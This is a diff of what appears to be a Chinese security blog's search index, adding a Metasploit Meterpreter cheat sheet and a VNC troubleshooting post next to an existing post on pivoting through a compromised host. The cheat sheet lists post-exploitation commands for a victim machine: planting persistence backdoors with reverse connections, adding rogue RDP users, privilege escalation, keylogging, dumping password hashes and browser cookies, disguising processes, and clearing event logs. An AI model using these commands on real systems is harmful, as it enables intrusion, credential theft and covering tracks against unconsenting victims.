@@ -1,6 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[解决run vnc无法控制的问题，以及-c参数无法打开shell]]></title>
+    <url>%2F2017%2F09%2F16%2FsolveRunVnc%2F</url>
+    <content type="text"><![CDATA[解决run vnc无法进行控制的问题，以及-c参数无法打开 Meterpreter run vnc 遇到的问题打开/usr/share/metasploit-framework/scripts/meterpreter/vnc.rb添加：然后问题就解决了如果-c参数无法打开courtesy shell，解决：]]></content>
+      <categories>
+        <category>问题解决</category>
+      </categories>
+      <tags>
+        <tag>meterpreter</tag>
+        <tag>run vnc</tag>
+        <tag>问题解决</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[meterpreter常用命令+脚本]]></title>
+    <url>%2F2017%2F09%2F16%2FmeterpreterCommand%2F</url>
+    <content type="text"><![CDATA[如题 meterpreter常用命令+脚本常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041、background返回，把meterpreter后台挂起2、sessions-u 将shell会话提升为meterpreter会话-v 以详细模式列出会话-x 增加扩展信息展示-l 查看已经成功获取的会话-i 与指定的会话进行交互，即切换到指定id的会话-k 杀掉指定id的会话-K 杀掉所有会话-C 执行一个meterpreter的命令-c 执行一个meterpreter的命令，需指定id-s 执行一个脚本，指定id3、shell获取目标主机的远程命令行shell，使用exit退出回到meterpreter4、cat查看目标主机上的文档内容cat c:\\boot.ini 或c:/boot.ini 查看主机启动引导信息 5、getwd与getlwd获取肉鸡的当前目录 和 获取本机的当前目录6、upload上传文件到肉鸡upload nc.exe c:/windows/system32/7、download下载文件到本地download c:\\boot.ini /root/8、edit调用vi编辑器，对目标主机上的文件进行修改edit c:\\windows\\system32\\drivers\\etc\\hosts9、search在肉鸡上搜索文件search -d c:/ -f *.doc10、ipconfig查看ip地址11、portfwd端口转发portfwd add -l 1234 -p 3389 -r 192.168.86.136，远程登录 0.0.0.0:1234 即可12、route显示肉鸡上的路由表13、getuid查看当前用户14、sysinfo查看系统信息15、ps查看肉鸡上运行的进程16、migrate将meterpreter会话移至到另一个进程17、execute让肉鸡运行某个程序-f 使用时需要加上-H 后台执行-a 传递给命令的参数-c 交互命令时使用-i 进程创建之后进行交互-m 从内存执行例：execute -H -m -d notepad.exe -f wce.exe -a &quot;-o wce.txt&quot;-d 在肉鸡执行时显示的进程名称（用来伪装），-m直接从内存中执行，&quot;-o wce.txt&quot;是wce.exe的运行参数18、getpid获取meterpreter的进程id19、shutdown关机20、post/windows/gather/forensics/enum_drives可获取目标主机存储器信息run post/windows/gather/forensics/enum_drives21、checkvm确定主机是否是一台虚拟机run checkvm22、persistence植入后门程序run persistence -X -i 5 -p 4444 -r 192.168.20.186-X 在肉鸡上开机自启动-i 不断尝试反向连接的时间间隔-r lhost-p lport23、metsvc将payload安装为服务（meterpreter），会建立一个端口成为服务器run metsvc24、getgui开启目标主机远程桌面，添加账号run getgui -e 开启远程桌面run getgui -u hacker -p hacker 添加用户25、getsystem提升权限到system26、keyscn键盘记录器keyscan_start 开始键盘记录keyscan_stop 停止键盘记录keyscan_dump 下载键盘记录27、hashdump获取账号密码28、post/windows/gather/enum_applications获取肉鸡上的软件安装信息run post/windows/gather/enum_applications29、post/windows/gather/dumplinks获取肉鸡最近访问过的文档、链接信息run dumplinks30、post/windows/gather/enum_ie读取目标主机IE浏览器cookies等缓存信息run post/windows/gather/enum_ie31、get_local_subnets查看已拿下的目标主机的内网IP段情况run get_local_subnets32、clearev痕迹擦除 好用脚本路径：（/usr/share/metasploit-framework/scripts/meterpreter）： 123456789101112131415161718192021checkvm 检查是否是虚拟机vnc 上传一个vnc服务到对方机器，然后在本地打开vnc服务并连接autoroute 可以添加，删除，显示路由表get_application_list 获取安装的程序列表enum_firefox 获取firefox中的信息arp_scanner 存活主机扫描（常用在内网） run arp_scanner -r 192.168.86.0/24get_env 获取环境变量credcollect 获取主机上的hash等凭证getgui 可以开启远程桌面服务，添加用户，端口转发 run getgui -f 12345 -e（3389转发到12345） run getgui -u hacker -p hacker （添加用户）dumplinks 文件操作记录（时间戳、文件位置、共享名、序列号等）duplicate 再次产生payload，注入到其他进程或打开新进程注入credcollect 收集主机的hash凭证metsvc 将payload安装为服务（meterpreter），会建立一个端口成为服务器persistence 建立一个持久性的后门hostsedit 操作hosts文件keylogrecorder 内置此功能winenum 自动运行多种命令，将命令结果保存到本地hashdump 与meterpreter的hashdump一样win32-sshserver 安装openssh服务（Linux）enum_logged_on_users 列出当前登陆的用户getvncpw 获取vnc密码]]></content>
+      <categories>
+        <category>meterpreter</category>
+      </categories>
+      <tags>
+        <tag>meterpreter</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[msf中代理使用方法]]></title>
     <url>%2F2017%2F09%2F15%2FmsfProxy%2F</url>
     <content type="text"><![CDATA[有的时候我们可能得到一台肉鸡的权限（meterpreter会话），想用这台肉鸡作为跳板去攻击肉鸡内网或互联网上的其他机器，就需要我们使用肉鸡作为代理啦。 msf中代理使用方法前提：已与肉鸡建立meterpreter会话 环境：攻击机kali：192.168.20.186 肉鸡xp：192.168.86.136内网其他机器server2003：192.168.86.138 实验思路： 要使用肉鸡作为代理，首先我们要先与对方建立会话，得到相应权限 然后本地建立一个路由表，让我们可以通过session 1找到肉鸡（因为有可能对方是在内网中，我们无法直接通过IP地址找到）。 通过sock4a模块，让肉鸡开启sock4a服务。 在本地配置proxychains，配置自己的sock4a客户端，让我们可以连接到sock4a服务端。连接后，proxychains的流量都会走肉鸡，为自己增加了一层代理保护。 步骤：1、1sessions -l 查看会话列表 2、12route add 192.168.86.136 255.255.255.0 1 添加路由表命令说明： route add 肉鸡ip 子网掩码 sessionId 1route 查看路由表，可以看到刚刚添加进去的路由信息 3、1234use auxiliary/server/socks4a 使用socks4a模块set srvhost 127.0.0.1 set srvport 1080exploit -y 4、12vi /etc/proxychains.conf 打开一个新终端，配置proxychains在最后添加一条 socks4 127.0.0.1 1080 ，保存退出 5、1proxychains rdesktop 192.168.86.138 远程登录内网server2003机器 代理成功]]></content>
@@ -149,7 +173,7 @@
     <url>%2F2017%2F09%2F04%2FsocksTOhttp%2F</url>
     <content type="text"><![CDATA[shadowsocks是socks5代理，但有的程序不支持socks代理（终端），只支持HTTP代理，怎么办呢？这个时候我们就需要将socks代理转换为http代理了。 linux下使用privoxy将socks转为http代理privoxy具有将socks代理转为http代理的功能。 1.开启shadowsocks根据自己SS的配置来 2.安装privoxy。1$ sudo apt-get install privoxy 3.更改provoxy配置12345位置在“/etc/privoxy/config”。$ sudo vim /etc/privoxy/config在里面添加：forward-socks5 / 127.0.0.1:1080 .listen-address localhost:8118 4.重启privoxy。1$ service privoxy restart 5.现在就可以使用http代理1http_proxy=http://localhost:8118 curl ip.gs 查看当前ip。 终端想使用代理就在每条命令前加上“http_proxy=http://localhost:8118”即可]]></content>
       <categories>
-        <category>代理配置</category>
+        <category>代理</category>
       </categories>
       <tags>
         <tag>代理</tag>
